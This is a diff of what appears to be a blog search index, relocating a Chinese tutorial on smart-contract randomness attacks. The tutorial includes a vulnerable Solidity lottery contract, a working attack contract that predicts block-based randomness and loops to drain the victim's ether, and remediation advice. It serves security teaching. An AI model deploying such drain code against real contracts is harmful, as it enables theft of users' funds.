@@ -97,31 +97,6 @@
       </tags>
   </entry>
   <entry>
-    <title>随机数攻击</title>
-    <url>/2023/06/24/%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%94%BB%E5%87%BB/</url>
-    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>随机数攻击，就是针对智能合约的随机数生成算法进行攻击，预测智能合约的随机数。</p>
-<p>常见的随机数获取有两种方式：使用区块变量生成随机数，使用预言机生成随机数。</p>
-<p><strong>区块链变量生成随机数</strong></p>
-<p>常见的区块链变量如下：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">block.basefee(uint)： 当前区块的基本费用</span><br><span class="line">block.chainid(uint)： 当前链id</span><br><span class="line">block.coinbase(address payable)： 当前区块矿工地址</span><br><span class="line">block.difficulty(uint)： 当前区块难度</span><br><span class="line">block.gaslimit(uint)： 当前区块gaslimit</span><br><span class="line">block.number(uint)： 当前区块号</span><br><span class="line">block.timestamp(uint)： 自Unix纪元以来的当前区块时间戳（以秒为单位）</span><br><span class="line">blockhash(uint blockNumber) returns (bytes32)： 给定区块的哈希，仅适用于256个最近的区块</span><br></pre></td></tr></table></figure></div>
-<p>由区块数据生成的随机数可能会限制普通用户预测随机数的可能性，但是并不能限制矿工作恶，矿工可以决定一个区块是否被广播，他们挖出了一个区块不是一定要广播出去也可以直接扔掉，这个就叫矿工的选择性打包。他们可以持续尝试生成随机数，直至得到想要的结果再广播出去。当然，旷工会这样做的前提是有足够的利益诱惑，例如可以获得一个很大的奖励池中的奖励，因此使用区块变量获取随机数的方法更适用于一些随机数不属于核心业务的应用。</p>
-<p><strong>预言机生成随机数</strong></p>
-<p>预言机是专门为生成随机数种子而搭建的链上或者链下的服务。除了使用第三方服务，也可以由 DApp 开发商自己搭建一个链下服务提供随机数，这种在链上获取链下数据的场景通常是通过链上预言机的方式来实现。</p>
-<p>当然这种方法也会有一些安全风险，例如依赖第三方给出的随机数种子的话同样会存在第三方作弊或者受贿的情形，即使是自己搭建的随机数服务也可能因为故障等原因无法使用，项目方也有可能操控随机数对 DApp 的运行和用户造成重大的损失。因此使用链下服务获取随机数的方法依赖于是否有一个可信又稳定的第三方服务，如果有，那么这个方法相较于使用区块链变量生成随机数的方法，随机数的不可预测性会更强一些。</p>
-<h3 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>猜数字游戏，玩家通过调用合约 mint() 函数，函数会产生一个随机数，如果随机数为奇数，表示中奖，会给于 1 ether 作为奖励；如果随机数为偶数，表示没有中奖。以下是漏洞代码：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract Random &#123;</span><br><span class="line">    event Log(string);</span><br><span class="line">    constructor() payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function _getRandom() private view returns(bool) &#123;</span><br><span class="line">        uint256 random = uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp)));</span><br><span class="line">        if(random%2 == 0) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint() public payable returns(bool randLucky) &#123;</span><br><span class="line">        randLucky = _getRandom();</span><br><span class="line">        if (randLucky == true) &#123;</span><br><span class="line">            require(payable(msg.sender).send(1 ether));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>以上代码实现使用了区块链变量来生成随机数的算法， 这里生成的随机数是可以被攻击预测到的，并可以清空受害合约的余额。<br>攻击合约使用死循环，不断判断受害合约的余额，直到取光所有的 ETH 。以下攻击代码：<br>如计算结果为偶数，需等待下一个区块；<br>如计算结果为奇数，保证获取奖励，并取走所有余额。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    event Log(string);</span><br><span class="line">    receive() external payable &#123; &#125;</span><br><span class="line"></span><br><span class="line">    function attack(address _random) external payable &#123;</span><br><span class="line">        for (;;) &#123;</span><br><span class="line">            if (_random.balance &lt; 1 ether) &#123;</span><br><span class="line">                emit Log(&quot;balance not enugh.&quot;);</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp))) % 2 == 0) &#123;</span><br><span class="line">                emit Log(&quot;failed to get rand number.&quot;);</span><br><span class="line">                return ;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            (bool ok, ) = _random.call(abi.encodeWithSignature(&quot;mint()&quot;));</span><br><span class="line">            if(!ok)&#123;</span><br><span class="line">                emit Log(&quot;failed to call mint().&quot;);</span><br><span class="line">                return ;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                emit Log(&quot;get reward success.&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p><strong>外部随机数生成器：</strong> 利用外部随机数生成服务，例如Chainlink VRF（Verifiable Random Function），提供真实随机数并且具备可验证的特性。<br><strong>多源输入：</strong> 将多个来源的数据组合生成随机数，例如区块链属性、用户输入，以及合约状态的混合使用，提升不可预测性。<br><strong>时间延迟：</strong> 不马上使用生成的随机数，而是等几个区块之后再使用，以增加干扰概率，降低操控的可能性。<br><strong>密码学方法：</strong> 使用密码学安全的随机数生成算法，确保攻击者无法逆推出初始状态或预测生成结果。</p>
-]]></content>
-      <tags>
-        <tag>Solidity</tag>
-        <tag>智能合约安全</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>GAS优化（二）</title>
     <url>/2024/05/18/GAS%E4%BC%98%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
     <content><![CDATA[<h2 id="逻辑优化"><a href="#逻辑优化" class="headerlink" title="逻辑优化"></a>逻辑优化</h2><h3 id="简化代码实现逻辑"><a href="#简化代码实现逻辑" class="headerlink" title="简化代码实现逻辑"></a>简化代码实现逻辑</h3><ul>
@@ -212,6 +187,31 @@
 <li>Solidity &lt; 0.8.0，使用openzeppelin提供的SafeMath库函数进行数值的加减乘除操作；</li>
 <li>Solidity &gt;&#x3D; 0.8.0, Solidity编译器自动集成SafeMath, 直接使用<code>+ - * /</code>即可，发生溢出时会自动回退交易.</li>
 </ul>
+]]></content>
+      <tags>
+        <tag>Solidity</tag>
+        <tag>智能合约安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>随机数攻击</title>
+    <url>/2023/06/24/%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%94%BB%E5%87%BB/</url>
+    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>随机数攻击，就是针对智能合约的随机数生成算法进行攻击，预测智能合约的随机数。</p>
+<p>常见的随机数获取有两种方式：使用区块变量生成随机数，使用预言机生成随机数。</p>
+<p><strong>区块链变量生成随机数</strong></p>
+<p>常见的区块链变量如下：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">block.basefee(uint)： 当前区块的基本费用</span><br><span class="line">block.chainid(uint)： 当前链id</span><br><span class="line">block.coinbase(address payable)： 当前区块矿工地址</span><br><span class="line">block.difficulty(uint)： 当前区块难度</span><br><span class="line">block.gaslimit(uint)： 当前区块gaslimit</span><br><span class="line">block.number(uint)： 当前区块号</span><br><span class="line">block.timestamp(uint)： 自Unix纪元以来的当前区块时间戳（以秒为单位）</span><br><span class="line">blockhash(uint blockNumber) returns (bytes32)： 给定区块的哈希，仅适用于256个最近的区块</span><br></pre></td></tr></table></figure></div>
+<p>由区块数据生成的随机数可能会限制普通用户预测随机数的可能性，但是并不能限制矿工作恶，矿工可以决定一个区块是否被广播，他们挖出了一个区块不是一定要广播出去也可以直接扔掉，这个就叫矿工的选择性打包。他们可以持续尝试生成随机数，直至得到想要的结果再广播出去。当然，旷工会这样做的前提是有足够的利益诱惑，例如可以获得一个很大的奖励池中的奖励，因此使用区块变量获取随机数的方法更适用于一些随机数不属于核心业务的应用。</p>
+<p><strong>预言机生成随机数</strong></p>
+<p>预言机是专门为生成随机数种子而搭建的链上或者链下的服务。除了使用第三方服务，也可以由 DApp 开发商自己搭建一个链下服务提供随机数，这种在链上获取链下数据的场景通常是通过链上预言机的方式来实现。</p>
+<p>当然这种方法也会有一些安全风险，例如依赖第三方给出的随机数种子的话同样会存在第三方作弊或者受贿的情形，即使是自己搭建的随机数服务也可能因为故障等原因无法使用，项目方也有可能操控随机数对 DApp 的运行和用户造成重大的损失。因此使用链下服务获取随机数的方法依赖于是否有一个可信又稳定的第三方服务，如果有，那么这个方法相较于使用区块链变量生成随机数的方法，随机数的不可预测性会更强一些。</p>
+<h3 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>猜数字游戏，玩家通过调用合约 mint() 函数，函数会产生一个随机数，如果随机数为奇数，表示中奖，会给于 1 ether 作为奖励；如果随机数为偶数，表示没有中奖。以下是漏洞代码：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract Random &#123;</span><br><span class="line">    event Log(string);</span><br><span class="line">    constructor() payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function _getRandom() private view returns(bool) &#123;</span><br><span class="line">        uint256 random = uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp)));</span><br><span class="line">        if(random%2 == 0) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint() public payable returns(bool randLucky) &#123;</span><br><span class="line">        randLucky = _getRandom();</span><br><span class="line">        if (randLucky == true) &#123;</span><br><span class="line">            require(payable(msg.sender).send(1 ether));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>以上代码实现使用了区块链变量来生成随机数的算法， 这里生成的随机数是可以被攻击预测到的，并可以清空受害合约的余额。<br>攻击合约使用死循环，不断判断受害合约的余额，直到取光所有的 ETH 。以下攻击代码：<br>如计算结果为偶数，需等待下一个区块；<br>如计算结果为奇数，保证获取奖励，并取走所有余额。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    event Log(string);</span><br><span class="line">    receive() external payable &#123; &#125;</span><br><span class="line"></span><br><span class="line">    function attack(address _random) external payable &#123;</span><br><span class="line">        for (;;) &#123;</span><br><span class="line">            if (_random.balance &lt; 1 ether) &#123;</span><br><span class="line">                emit Log(&quot;balance not enugh.&quot;);</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp))) % 2 == 0) &#123;</span><br><span class="line">                emit Log(&quot;failed to get rand number.&quot;);</span><br><span class="line">                return ;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            (bool ok, ) = _random.call(abi.encodeWithSignature(&quot;mint()&quot;));</span><br><span class="line">            if(!ok)&#123;</span><br><span class="line">                emit Log(&quot;failed to call mint().&quot;);</span><br><span class="line">                return ;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                emit Log(&quot;get reward success.&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p><strong>外部随机数生成器：</strong> 利用外部随机数生成服务，例如Chainlink VRF（Verifiable Random Function），提供真实随机数并且具备可验证的特性。<br><strong>多源输入：</strong> 将多个来源的数据组合生成随机数，例如区块链属性、用户输入，以及合约状态的混合使用，提升不可预测性。<br><strong>时间延迟：</strong> 不马上使用生成的随机数，而是等几个区块之后再使用，以增加干扰概率，降低操控的可能性。<br><strong>密码学方法：</strong> 使用密码学安全的随机数生成算法，确保攻击者无法逆推出初始状态或预测生成结果。</p>
 ]]></content>
       <tags>
         <tag>Solidity</tag>
